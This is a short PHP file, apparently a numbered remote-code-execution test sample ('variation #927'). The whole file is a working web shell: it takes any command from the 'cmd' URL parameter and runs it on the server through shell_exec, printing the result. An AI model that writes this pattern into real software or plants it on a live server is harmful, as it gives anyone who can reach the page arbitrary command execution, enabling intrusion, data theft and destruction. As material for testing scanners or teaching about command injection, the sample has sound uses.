<?php
// RCE test variation #927
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>